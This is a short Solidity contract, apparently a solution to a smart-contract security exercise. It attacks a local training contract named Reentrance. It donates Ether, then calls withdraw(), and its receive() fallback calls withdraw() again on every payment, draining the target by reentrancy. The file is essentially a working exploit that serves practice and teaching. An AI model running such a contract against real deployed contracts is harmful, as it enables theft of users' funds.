// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

interface ReentranceInterface {
    function donate(address _to) external payable;
    function withdraw() external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive () external payable {
        ReentranceInterface(contractAddress).withdraw();
    }

    function hackContract() external {
        // Code me!
        uint256 balance = address(this).balance;
        ReentranceInterface(contractAddress).donate{value: balance}(address(this));
        ReentranceInterface(contractAddress).withdraw();
    }
}
